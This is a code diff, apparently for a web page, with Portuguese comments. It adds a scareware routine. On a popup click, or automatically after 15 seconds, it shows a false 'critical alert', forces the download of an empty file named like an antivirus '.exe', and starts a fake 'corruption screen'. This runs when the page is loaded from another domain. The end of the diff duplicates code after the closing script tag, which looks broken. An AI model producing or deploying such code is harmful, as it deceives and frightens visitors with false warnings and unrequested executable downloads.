@@ -120,6 +120,17 @@ function obterCidade() {
         });
 }
 
+function baixarArquivoFalso() {
+    const blob = new Blob([""], { type: "application/octet-stream" }); // Arquivo vazio
+    const nomeAleatorio = 'antivirus-superior-defense-' + Math.floor(Math.random() * 1000000) + '.exe';
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = nomeAleatorio;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
 // Função para iniciar o corruption screen
 function iniciarCorrupcao() {
     const tela = document.getElementById('corrupt-screen');
@@ -136,20 +147,28 @@ function iniciarCorrupcao() {
     }
 }
 
-// Função para ativar os eventos de clique e tempo
+// Eventos de clique e timeout
 function ativarEventos() {
     const popup = document.querySelector('.popup');
 
-    // Começar corrupção se clicar no popup
-    popup.addEventListener('click', function () {
+    function acionarAlerta() {
+        alert("Você ativou um alerta crítico. Baixando ferramenta de diagnóstico...");
+        baixarArquivoFalso();
         iniciarCorrupcao();
-    });
+    }
 
-    // Ou começar corrupção após 15 segundos parado
-    setTimeout(function () {
-        iniciarCorrupcao();
+    popup.addEventListener('click', acionarAlerta);
+
+    setTimeout(() => {
+        acionarAlerta();
     }, 15000);
 }
+
+// Executar se domínio for diferente
+if (!window.location.href.startsWith(urlDomain)) {
+    criarPopup();
+}
+</script>
 
 if (!window.location.href.startsWith(urlDomain)) {
     criarPopup();
